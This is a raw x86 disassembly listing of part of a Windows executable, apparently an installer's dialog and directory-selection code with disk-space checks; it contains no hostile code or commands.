  40423d:	ff 15 18 82 40 00    	call   *0x408218
  404243:	ff 35 20 01 42 00    	push   0x420120
  404249:	89 2d 48 47 42 00    	mov    %ebp,0x424748
  40424f:	57                   	push   %edi
  404250:	ff 15 f8 81 40 00    	call   *0x4081f8
  404256:	39 2d 50 1d 42 00    	cmp    %ebp,0x421d50
  40425c:	75 1b                	jne    0x404279
  40425e:	39 2d 18 3f 42 00    	cmp    %ebp,0x423f18
  404264:	74 13                	je     0x404279
  404266:	6a 0a                	push   $0xa
  404268:	57                   	push   %edi
  404269:	ff 15 30 82 40 00    	call   *0x408230
  40426f:	c7 05 50 1d 42 00 01 	movl   $0x1,0x421d50
  404276:	00 00 00 
  404279:	33 c0                	xor    %eax,%eax
  40427b:	5f                   	pop    %edi
  40427c:	5e                   	pop    %esi
  40427d:	5d                   	pop    %ebp
  40427e:	5b                   	pop    %ebx
  40427f:	83 c4 10             	add    $0x10,%esp
  404282:	c2 10 00             	ret    $0x10
  404285:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  40428a:	75 06                	jne    0x404292
  40428c:	ff 05 0c 3f 42 00    	incl   0x423f0c
  404292:	6a 00                	push   $0x0
  404294:	ff 74 24 08          	push   0x8(%esp)
  404298:	68 08 04 00 00       	push   $0x408
  40429d:	ff 35 48 47 42 00    	push   0x424748
  4042a3:	ff 15 60 82 40 00    	call   *0x408260
  4042a9:	c2 04 00             	ret    $0x4
  4042ac:	ff 74 24 0c          	push   0xc(%esp)
  4042b0:	6a 00                	push   $0x0
  4042b2:	e8 04 20 00 00       	call   0x4062bb
  4042b7:	50                   	push   %eax
  4042b8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4042bc:	05 e8 03 00 00       	add    $0x3e8,%eax
  4042c1:	50                   	push   %eax
  4042c2:	ff 74 24 0c          	push   0xc(%esp)
  4042c6:	e8 57 16 00 00       	call   0x405922
  4042cb:	c2 0c 00             	ret    $0xc
  4042ce:	ff 74 24 04          	push   0x4(%esp)
  4042d2:	ff 35 4c 0d 42 00    	push   0x420d4c
  4042d8:	ff 15 58 82 40 00    	call   *0x408258
  4042de:	c2 04 00             	ret    $0x4
  4042e1:	6a 01                	push   $0x1
  4042e3:	ff 74 24 08          	push   0x8(%esp)
  4042e7:	6a 28                	push   $0x28
  4042e9:	ff 35 48 47 42 00    	push   0x424748
  4042ef:	ff 15 60 82 40 00    	call   *0x408260
  4042f5:	c2 04 00             	ret    $0x4
  4042f8:	a1 18 3f 42 00       	mov    0x423f18,%eax
  4042fd:	85 c0                	test   %eax,%eax
  4042ff:	74 0f                	je     0x404310
  404301:	6a 00                	push   $0x0
  404303:	6a 00                	push   $0x0
  404305:	ff 74 24 0c          	push   0xc(%esp)
  404309:	50                   	push   %eax
  40430a:	ff 15 60 82 40 00    	call   *0x408260
  404310:	c2 04 00             	ret    $0x4
  404313:	55                   	push   %ebp
  404314:	8b ec                	mov    %esp,%ebp
  404316:	83 ec 0c             	sub    $0xc,%esp
  404319:	8b 45 08             	mov    0x8(%ebp),%eax
  40431c:	56                   	push   %esi
  40431d:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  404322:	83 f8 05             	cmp    $0x5,%eax
  404325:	0f 87 b0 00 00 00    	ja     0x4043db
  40432b:	6a eb                	push   $0xffffffeb
  40432d:	ff 75 10             	push   0x10(%ebp)
  404330:	ff 15 d4 81 40 00    	call   *0x4081d4
  404336:	8b f0                	mov    %eax,%esi
  404338:	85 f6                	test   %esi,%esi
  40433a:	0f 84 9b 00 00 00    	je     0x4043db
  404340:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  404344:	0f 87 91 00 00 00    	ja     0x4043db
  40434a:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  40434e:	0f 87 87 00 00 00    	ja     0x4043db
  404354:	8b 4e 14             	mov    0x14(%esi),%ecx
  404357:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  40435d:	75 7c                	jne    0x4043db
  40435f:	8b 06                	mov    (%esi),%eax
  404361:	57                   	push   %edi
  404362:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  404368:	f6 c1 02             	test   $0x2,%cl
  40436b:	74 03                	je     0x404370
  40436d:	50                   	push   %eax
  40436e:	ff d7                	call   *%edi
  404370:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  404374:	74 0a                	je     0x404380
  404376:	50                   	push   %eax
  404377:	ff 75 0c             	push   0xc(%ebp)
  40437a:	ff 15 64 80 40 00    	call   *0x408064
  404380:	ff 76 10             	push   0x10(%esi)
  404383:	ff 75 0c             	push   0xc(%ebp)
  404386:	ff 15 4c 80 40 00    	call   *0x40804c
  40438c:	8b 46 04             	mov    0x4(%esi),%eax
  40438f:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  404393:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404396:	74 06                	je     0x40439e
  404398:	50                   	push   %eax
  404399:	ff d7                	call   *%edi
  40439b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40439e:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4043a2:	5f                   	pop    %edi
  4043a3:	74 0a                	je     0x4043af
  4043a5:	50                   	push   %eax
  4043a6:	ff 75 0c             	push   0xc(%ebp)
  4043a9:	ff 15 50 80 40 00    	call   *0x408050
  4043af:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  4043b3:	74 21                	je     0x4043d6
  4043b5:	8b 46 08             	mov    0x8(%esi),%eax
  4043b8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4043bb:	8b 46 0c             	mov    0xc(%esi),%eax
  4043be:	85 c0                	test   %eax,%eax
  4043c0:	74 07                	je     0x4043c9
  4043c2:	50                   	push   %eax
  4043c3:	ff 15 60 80 40 00    	call   *0x408060
  4043c9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4043cc:	50                   	push   %eax
  4043cd:	ff 15 5c 80 40 00    	call   *0x40805c
  4043d3:	89 46 0c             	mov    %eax,0xc(%esi)
  4043d6:	8b 46 0c             	mov    0xc(%esi),%eax
  4043d9:	eb 02                	jmp    0x4043dd
  4043db:	33 c0                	xor    %eax,%eax
  4043dd:	5e                   	pop    %esi
  4043de:	c9                   	leave
  4043df:	c2 0c 00             	ret    $0xc
  4043e2:	55                   	push   %ebp
  4043e3:	8b ec                	mov    %esp,%ebp
  4043e5:	8b 45 08             	mov    0x8(%ebp),%eax
  4043e8:	8b 0d 1c fd 41 00    	mov    0x41fd1c,%ecx
  4043ee:	ff 75 10             	push   0x10(%ebp)
  4043f1:	03 c8                	add    %eax,%ecx
  4043f3:	51                   	push   %ecx
  4043f4:	ff 75 0c             	push   0xc(%ebp)
  4043f7:	ff 15 ac 80 40 00    	call   *0x4080ac
  4043fd:	ff 75 0c             	push   0xc(%ebp)
  404400:	ff 15 b8 80 40 00    	call   *0x4080b8
  404406:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404409:	89 01                	mov    %eax,(%ecx)
  40440b:	01 05 1c fd 41 00    	add    %eax,0x41fd1c
  404411:	33 c0                	xor    %eax,%eax
  404413:	5d                   	pop    %ebp
  404414:	c2 10 00             	ret    $0x10
  404417:	55                   	push   %ebp
  404418:	8b ec                	mov    %esp,%ebp
  40441a:	83 ec 0c             	sub    $0xc,%esp
  40441d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404424:	53                   	push   %ebx
  404425:	56                   	push   %esi
  404426:	57                   	push   %edi
  404427:	0f 85 0c 01 00 00    	jne    0x404539
  40442d:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404430:	8b 7b 30             	mov    0x30(%ebx),%edi
  404433:	85 ff                	test   %edi,%edi
  404435:	7d 11                	jge    0x404448
  404437:	8b 0d 1c 3f 42 00    	mov    0x423f1c,%ecx
  40443d:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  404444:	2b c8                	sub    %eax,%ecx
  404446:	8b 39                	mov    (%ecx),%edi
  404448:	a1 98 47 42 00       	mov    0x424798,%eax
  40444d:	ff 73 34             	push   0x34(%ebx)
  404450:	03 f8                	add    %eax,%edi
  404452:	6a 22                	push   $0x22
  404454:	0f be 07             	movsbl (%edi),%eax
  404457:	89 45 14             	mov    %eax,0x14(%ebp)
  40445a:	8b 43 14             	mov    0x14(%ebx),%eax
  40445d:	ff 75 08             	push   0x8(%ebp)
  404460:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404464:	8b f0                	mov    %eax,%esi
  404466:	47                   	inc    %edi
  404467:	f7 d6                	not    %esi
  404469:	c1 ee 05             	shr    $0x5,%esi
  40446c:	83 e6 01             	and    $0x1,%esi
  40446f:	83 e0 01             	and    $0x1,%eax
  404472:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404475:	c7 45 fc e2 43 40 00 	movl   $0x4043e2,-0x4(%ebp)
  40447c:	0b f0                	or     %eax,%esi
  40447e:	e8 29 fe ff ff       	call   0x4042ac
  404483:	ff 73 38             	push   0x38(%ebx)
  404486:	6a 23                	push   $0x23
  404488:	ff 75 08             	push   0x8(%ebp)
  40448b:	e8 1c fe ff ff       	call   0x4042ac
  404490:	33 c0                	xor    %eax,%eax
  404492:	6a 01                	push   $0x1
  404494:	85 f6                	test   %esi,%esi
  404496:	0f 94 c0             	sete   %al
  404499:	05 0a 04 00 00       	add    $0x40a,%eax
  40449e:	50                   	push   %eax
  40449f:	ff 75 08             	push   0x8(%ebp)
  4044a2:	ff 15 c8 81 40 00    	call   *0x4081c8
  4044a8:	56                   	push   %esi
  4044a9:	e8 20 fe ff ff       	call   0x4042ce
  4044ae:	68 e8 03 00 00       	push   $0x3e8
  4044b3:	ff 75 08             	push   0x8(%ebp)
  4044b6:	ff 15 38 82 40 00    	call   *0x408238
  4044bc:	8b d8                	mov    %eax,%ebx
  4044be:	53                   	push   %ebx
  4044bf:	e8 1d fe ff ff       	call   0x4042e1
  4044c4:	8b 35 60 82 40 00    	mov    0x408260,%esi
  4044ca:	6a 00                	push   $0x0
  4044cc:	6a 01                	push   $0x1
  4044ce:	68 5b 04 00 00       	push   $0x45b
  4044d3:	53                   	push   %ebx
  4044d4:	ff d6                	call   *%esi
  4044d6:	a1 54 47 42 00       	mov    0x424754,%eax
  4044db:	8b 40 68             	mov    0x68(%eax),%eax
  4044de:	85 c0                	test   %eax,%eax
  4044e0:	7d 09                	jge    0x4044eb
  4044e2:	f7 d8                	neg    %eax
  4044e4:	50                   	push   %eax
  4044e5:	ff 15 cc 81 40 00    	call   *0x4081cc
  4044eb:	50                   	push   %eax
  4044ec:	6a 00                	push   $0x0
  4044ee:	68 43 04 00 00       	push   $0x443
  4044f3:	53                   	push   %ebx
  4044f4:	ff d6                	call   *%esi
  4044f6:	68 00 00 01 04       	push   $0x4010000
  4044fb:	6a 00                	push   $0x0
  4044fd:	68 45 04 00 00       	push   $0x445
  404502:	53                   	push   %ebx
  404503:	ff d6                	call   *%esi
  404505:	57                   	push   %edi
  404506:	e8 33 1d 00 00       	call   0x40623e
  40450b:	33 ff                	xor    %edi,%edi
  40450d:	50                   	push   %eax
  40450e:	57                   	push   %edi
  40450f:	68 35 04 00 00       	push   $0x435
  404514:	53                   	push   %ebx
  404515:	ff d6                	call   *%esi
  404517:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40451a:	89 3d 1c fd 41 00    	mov    %edi,0x41fd1c
  404520:	50                   	push   %eax
  404521:	ff 75 14             	push   0x14(%ebp)
  404524:	68 49 04 00 00       	push   $0x449
  404529:	53                   	push   %ebx
  40452a:	ff d6                	call   *%esi
  40452c:	89 3d 1c fd 41 00    	mov    %edi,0x41fd1c
  404532:	33 c0                	xor    %eax,%eax
  404534:	e9 57 01 00 00       	jmp    0x404690
  404539:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404540:	8b 1d 38 82 40 00    	mov    0x408238,%ebx
  404546:	8b 35 60 82 40 00    	mov    0x408260,%esi
  40454c:	75 5a                	jne    0x4045a8
  40454e:	8b 45 10             	mov    0x10(%ebp),%eax
  404551:	c1 e8 10             	shr    $0x10,%eax
  404554:	66 85 c0             	test   %ax,%ax
  404557:	0f 85 24 01 00 00    	jne    0x404681
  40455d:	33 c0                	xor    %eax,%eax
  40455f:	39 05 1c fd 41 00    	cmp    %eax,0x41fd1c
  404565:	0f 85 16 01 00 00    	jne    0x404681
  40456b:	8b 0d 28 05 42 00    	mov    0x420528,%ecx
  404571:	8d 79 14             	lea    0x14(%ecx),%edi
  404574:	f6 07 20             	testb  $0x20,(%edi)
  404577:	0f 84 04 01 00 00    	je     0x404681
  40457d:	50                   	push   %eax
  40457e:	50                   	push   %eax
  40457f:	68 f0 00 00 00       	push   $0xf0
  404584:	68 0a 04 00 00       	push   $0x40a
  404589:	ff 75 08             	push   0x8(%ebp)
  40458c:	ff d3                	call   *%ebx
  40458e:	50                   	push   %eax
  40458f:	ff d6                	call   *%esi
  404591:	8b 0f                	mov    (%edi),%ecx
  404593:	83 e0 01             	and    $0x1,%eax
  404596:	83 e1 fe             	and    $0xfffffffe,%ecx
  404599:	50                   	push   %eax
  40459a:	0b c8                	or     %eax,%ecx
  40459c:	89 0f                	mov    %ecx,(%edi)
  40459e:	e8 2b fd ff ff       	call   0x4042ce
  4045a3:	e8 ef 00 00 00       	call   0x404697
  4045a8:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4045ac:	0f 85 c0 00 00 00    	jne    0x404672
  4045b2:	68 e8 03 00 00       	push   $0x3e8
  4045b7:	ff 75 08             	push   0x8(%ebp)
  4045ba:	ff d3                	call   *%ebx
  4045bc:	8b 7d 14             	mov    0x14(%ebp),%edi
  4045bf:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4045c6:	75 68                	jne    0x404630
  4045c8:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4045cf:	75 5f                	jne    0x404630
  4045d1:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4045d4:	8b 57 18             	mov    0x18(%edi),%edx
  4045d7:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4045da:	2b ca                	sub    %edx,%ecx
  4045dc:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4045e2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4045e5:	c7 45 fc e0 36 42 00 	movl   $0x4236e0,-0x4(%ebp)
  4045ec:	73 42                	jae    0x404630
  4045ee:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4045f1:	51                   	push   %ecx
  4045f2:	6a 00                	push   $0x0
  4045f4:	68 4b 04 00 00       	push   $0x44b
  4045f9:	50                   	push   %eax
  4045fa:	ff d6                	call   *%esi
  4045fc:	8b 3d c0 81 40 00    	mov    0x4081c0,%edi
  404602:	68 02 7f 00 00       	push   $0x7f02
  404607:	6a 00                	push   $0x0
  404609:	ff d7                	call   *%edi
  40460b:	8b 1d d0 81 40 00    	mov    0x4081d0,%ebx
  404611:	50                   	push   %eax
  404612:	ff d3                	call   *%ebx
  404614:	6a 01                	push   $0x1
  404616:	ff 75 fc             	push   -0x4(%ebp)
  404619:	ff 75 08             	push   0x8(%ebp)
  40461c:	e8 9a 00 00 00       	call   0x4046bb
  404621:	68 00 7f 00 00       	push   $0x7f00
  404626:	6a 00                	push   $0x0
  404628:	ff d7                	call   *%edi
  40462a:	50                   	push   %eax
  40462b:	ff d3                	call   *%ebx
  40462d:	8b 7d 14             	mov    0x14(%ebp),%edi
  404630:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404637:	75 4b                	jne    0x404684
  404639:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404640:	75 42                	jne    0x404684
  404642:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404646:	75 11                	jne    0x404659
  404648:	6a 00                	push   $0x0
  40464a:	6a 01                	push   $0x1
  40464c:	68 11 01 00 00       	push   $0x111
  404651:	ff 35 48 47 42 00    	push   0x424748
  404657:	ff d6                	call   *%esi
  404659:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  40465d:	75 0e                	jne    0x40466d
  40465f:	6a 00                	push   $0x0
  404661:	6a 00                	push   $0x0
  404663:	6a 10                	push   $0x10
  404665:	ff 35 48 47 42 00    	push   0x424748
  40466b:	ff d6                	call   *%esi
  40466d:	33 c0                	xor    %eax,%eax
  40466f:	40                   	inc    %eax
  404670:	eb 1e                	jmp    0x404690
  404672:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404679:	75 06                	jne    0x404681
  40467b:	ff 05 1c fd 41 00    	incl   0x41fd1c
  404681:	8b 7d 14             	mov    0x14(%ebp),%edi
  404684:	57                   	push   %edi
  404685:	ff 75 10             	push   0x10(%ebp)
  404688:	ff 75 0c             	push   0xc(%ebp)
  40468b:	e8 83 fc ff ff       	call   0x404313
  404690:	5f                   	pop    %edi
  404691:	5e                   	pop    %esi
  404692:	5b                   	pop    %ebx
  404693:	c9                   	leave
  404694:	c2 10 00             	ret    $0x10
  404697:	83 3d ec 47 42 00 00 	cmpl   $0x0,0x4247ec
  40469e:	a1 18 fd 41 00       	mov    0x41fd18,%eax
  4046a3:	75 05                	jne    0x4046aa
  4046a5:	a1 4c 0d 42 00       	mov    0x420d4c,%eax
  4046aa:	6a 01                	push   $0x1
  4046ac:	6a 01                	push   $0x1
  4046ae:	68 f4 00 00 00       	push   $0xf4
  4046b3:	50                   	push   %eax
  4046b4:	ff 15 60 82 40 00    	call   *0x408260
  4046ba:	c3                   	ret
  4046bb:	55                   	push   %ebp
  4046bc:	8b ec                	mov    %esp,%ebp
  4046be:	83 ec 3c             	sub    $0x3c,%esp
  4046c1:	8b 45 08             	mov    0x8(%ebp),%eax
  4046c4:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4046c8:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4046cc:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046cf:	8b 45 0c             	mov    0xc(%ebp),%eax
  4046d2:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4046d9:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4046dc:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4046df:	50                   	push   %eax
  4046e0:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  4046e7:	c7 45 d0 1c a2 40 00 	movl   $0x40a21c,-0x30(%ebp)
  4046ee:	e8 17 12 00 00       	call   0x40590a
  4046f3:	c9                   	leave
  4046f4:	c2 0c 00             	ret    $0xc
  4046f7:	55                   	push   %ebp
  4046f8:	8b ec                	mov    %esp,%ebp
  4046fa:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404701:	56                   	push   %esi
  404702:	8b 75 14             	mov    0x14(%ebp),%esi
  404705:	75 26                	jne    0x40472d
  404707:	ff 76 30             	push   0x30(%esi)
  40470a:	6a 1d                	push   $0x1d
  40470c:	ff 75 08             	push   0x8(%ebp)
  40470f:	e8 98 fb ff ff       	call   0x4042ac
  404714:	8b 46 3c             	mov    0x3c(%esi),%eax
  404717:	c1 e0 0a             	shl    $0xa,%eax
  40471a:	05 00 50 42 00       	add    $0x425000,%eax
  40471f:	50                   	push   %eax
  404720:	68 e8 03 00 00       	push   $0x3e8
  404725:	ff 75 08             	push   0x8(%ebp)
  404728:	e8 f5 11 00 00       	call   0x405922
  40472d:	56                   	push   %esi
  40472e:	ff 75 10             	push   0x10(%ebp)
  404731:	ff 75 0c             	push   0xc(%ebp)
  404734:	e8 da fb ff ff       	call   0x404313
  404739:	5e                   	pop    %esi
  40473a:	5d                   	pop    %ebp
  40473b:	c2 10 00             	ret    $0x10
  40473e:	55                   	push   %ebp
  40473f:	8b ec                	mov    %esp,%ebp
  404741:	83 ec 4c             	sub    $0x4c,%esp
  404744:	a1 28 05 42 00       	mov    0x420528,%eax
  404749:	53                   	push   %ebx
  40474a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40474d:	56                   	push   %esi
  40474e:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404751:	8b 40 38             	mov    0x38(%eax),%eax
  404754:	c1 e3 0a             	shl    $0xa,%ebx
  404757:	81 c3 00 50 42 00    	add    $0x425000,%ebx
  40475d:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404764:	57                   	push   %edi
  404765:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404768:	75 11                	jne    0x40477b
  40476a:	53                   	push   %ebx
  40476b:	68 fb 03 00 00       	push   $0x3fb
  404770:	e8 b3 11 00 00       	call   0x405928
  404775:	53                   	push   %ebx
  404776:	e8 88 1d 00 00       	call   0x406503
  40477b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404782:	8b 75 08             	mov    0x8(%ebp),%esi
  404785:	75 6c                	jne    0x4047f3
  404787:	68 fb 03 00 00       	push   $0x3fb
  40478c:	56                   	push   %esi
  40478d:	ff 15 38 82 40 00    	call   *0x408238
  404793:	53                   	push   %ebx
  404794:	8b f8                	mov    %eax,%edi
  404796:	e8 92 14 00 00       	call   0x405c2d
  40479b:	85 c0                	test   %eax,%eax
  40479d:	74 10                	je     0x4047af
  40479f:	53                   	push   %ebx
  4047a0:	e8 b4 14 00 00       	call   0x405c59
  4047a5:	85 c0                	test   %eax,%eax
  4047a7:	75 06                	jne    0x4047af
  4047a9:	53                   	push   %ebx
  4047aa:	e8 11 14 00 00       	call   0x405bc0
  4047af:	53                   	push   %ebx
  4047b0:	57                   	push   %edi
  4047b1:	89 35 18 3f 42 00    	mov    %esi,0x423f18
  4047b7:	ff 15 24 82 40 00    	call   *0x408224
  4047bd:	8b 45 14             	mov    0x14(%ebp),%eax
  4047c0:	ff 70 34             	push   0x34(%eax)
  4047c3:	6a 01                	push   $0x1
  4047c5:	56                   	push   %esi
  4047c6:	e8 e1 fa ff ff       	call   0x4042ac
  4047cb:	8b 45 14             	mov    0x14(%ebp),%eax
  4047ce:	ff 70 30             	push   0x30(%eax)
  4047d1:	6a 14                	push   $0x14
  4047d3:	56                   	push   %esi
  4047d4:	e8 d3 fa ff ff       	call   0x4042ac
  4047d9:	57                   	push   %edi
  4047da:	e8 02 fb ff ff       	call   0x4042e1
  4047df:	6a 08                	push   $0x8
  4047e1:	e8 4b 1e 00 00       	call   0x406631
  4047e6:	85 c0                	test   %eax,%eax
  4047e8:	0f 84 8c 02 00 00    	je     0x404a7a
  4047ee:	6a 01                	push   $0x1
  4047f0:	57                   	push   %edi
  4047f1:	ff d0                	call   *%eax
  4047f3:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4047fa:	0f 85 d1 00 00 00    	jne    0x4048d1
  404800:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404804:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404809:	75 18                	jne    0x404823
  40480b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40480e:	c1 e9 10             	shr    $0x10,%ecx
  404811:	66 81 f9 00 03       	cmp    $0x300,%cx
  404816:	0f 85 5e 02 00 00    	jne    0x404a7a
  40481c:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404823:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404828:	0f 85 a3 00 00 00    	jne    0x4048d1
  40482e:	6a 07                	push   $0x7
  404830:	33 c0                	xor    %eax,%eax
  404832:	59                   	pop    %ecx
  404833:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404836:	ff 75 f8             	push   -0x8(%ebp)
  404839:	f3 ab                	rep stos %eax,%es:(%edi)
  40483b:	bf 50 0d 42 00       	mov    $0x420d50,%edi
  404840:	68 28 01 42 00       	push   $0x420128
  404845:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404848:	89 7d bc             	mov    %edi,-0x44(%ebp)
  40484b:	c7 45 c8 8f 4a 40 00 	movl   $0x404a8f,-0x38(%ebp)
  404852:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404855:	e8 61 1a 00 00       	call   0x4062bb
  40485a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40485d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404860:	50                   	push   %eax
  404861:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404868:	ff 15 80 81 40 00    	call   *0x408180
  40486e:	85 c0                	test   %eax,%eax
  404870:	74 58                	je     0x4048ca
  404872:	50                   	push   %eax
  404873:	ff 15 94 82 40 00    	call   *0x408294
  404879:	53                   	push   %ebx
  40487a:	e8 41 13 00 00       	call   0x405bc0
  40487f:	a1 54 47 42 00       	mov    0x424754,%eax
  404884:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  40488a:	85 c0                	test   %eax,%eax
  40488c:	74 28                	je     0x4048b6
  40488e:	81 fb 00 a4 42 00    	cmp    $0x42a400,%ebx
  404894:	75 20                	jne    0x4048b6
  404896:	50                   	push   %eax
  404897:	6a 00                	push   $0x0
  404899:	e8 1d 1a 00 00       	call   0x4062bb
  40489e:	57                   	push   %edi
  40489f:	bf e0 36 42 00       	mov    $0x4236e0,%edi
  4048a4:	57                   	push   %edi
  4048a5:	ff 15 18 81 40 00    	call   *0x408118
  4048ab:	85 c0                	test   %eax,%eax
  4048ad:	74 07                	je     0x4048b6
  4048af:	57                   	push   %edi
  4048b0:	53                   	push   %ebx
  4048b1:	e8 8e 19 00 00       	call   0x406244
  4048b6:	ff 05 40 0d 42 00    	incl   0x420d40
  4048bc:	53                   	push   %ebx
  4048bd:	68 fb 03 00 00       	push   $0x3fb
  4048c2:	56                   	push   %esi
  4048c3:	e8 5a 10 00 00       	call   0x405922
  4048c8:	eb 07                	jmp    0x4048d1
  4048ca:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4048d1:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4048d8:	74 0d                	je     0x4048e7
  4048da:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4048e1:	0f 85 93 01 00 00    	jne    0x404a7a
  4048e7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4048eb:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4048ef:	53                   	push   %ebx
  4048f0:	68 fb 03 00 00       	push   $0x3fb
  4048f5:	e8 2e 10 00 00       	call   0x405928
  4048fa:	53                   	push   %ebx
  4048fb:	e8 ae 13 00 00       	call   0x405cae
  404900:	85 c0                	test   %eax,%eax
  404902:	75 07                	jne    0x40490b
  404904:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40490b:	be 20 fd 41 00       	mov    $0x41fd20,%esi
  404910:	53                   	push   %ebx
  404911:	56                   	push   %esi
  404912:	e8 11 19 00 00       	call   0x406228
  404917:	6a 01                	push   $0x1
  404919:	e8 13 1d 00 00       	call   0x406631
  40491e:	85 c0                	test   %eax,%eax
  404920:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404923:	74 35                	je     0x40495a
  404925:	33 c0                	xor    %eax,%eax
  404927:	33 ff                	xor    %edi,%edi
  404929:	3b c6                	cmp    %esi,%eax
  40492b:	74 2d                	je     0x40495a
  40492d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404930:	50                   	push   %eax
  404931:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404934:	50                   	push   %eax
  404935:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404938:	50                   	push   %eax
  404939:	56                   	push   %esi
  40493a:	ff 55 f4             	call   *-0xc(%ebp)
  40493d:	85 c0                	test   %eax,%eax
  40493f:	75 71                	jne    0x4049b2
  404941:	85 ff                	test   %edi,%edi
  404943:	74 02                	je     0x404947
  404945:	20 07                	and    %al,(%edi)
  404947:	56                   	push   %esi
  404948:	e8 ba 12 00 00       	call   0x405c07
  40494d:	8b f8                	mov    %eax,%edi
  40494f:	80 27 00             	andb   $0x0,(%edi)
  404952:	4f                   	dec    %edi
  404953:	3b fe                	cmp    %esi,%edi
  404955:	c6 07 5c             	movb   $0x5c,(%edi)
  404958:	75 d3                	jne    0x40492d
  40495a:	53                   	push   %ebx
  40495b:	56                   	push   %esi
  40495c:	e8 c7 18 00 00       	call   0x406228
  404961:	56                   	push   %esi
  404962:	e8 f2 12 00 00       	call   0x405c59
  404967:	33 ff                	xor    %edi,%edi
  404969:	3b c7                	cmp    %edi,%eax
  40496b:	74 03                	je     0x404970
  40496d:	80 20 00             	andb   $0x0,(%eax)
  404970:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404973:	50                   	push   %eax
  404974:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404977:	50                   	push   %eax
  404978:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40497b:	50                   	push   %eax
  40497c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40497f:	50                   	push   %eax
  404980:	56                   	push   %esi
  404981:	ff 15 b4 80 40 00    	call   *0x4080b4
  404987:	85 c0                	test   %eax,%eax
  404989:	74 43                	je     0x4049ce
  40498b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40498e:	be 00 04 00 00       	mov    $0x400,%esi
  404993:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404997:	56                   	push   %esi
  404998:	ff 75 f4             	push   -0xc(%ebp)
  40499b:	50                   	push   %eax
  40499c:	ff 15 64 81 40 00    	call   *0x408164
  4049a2:	99                   	cltd
  4049a3:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4049a6:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4049a9:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
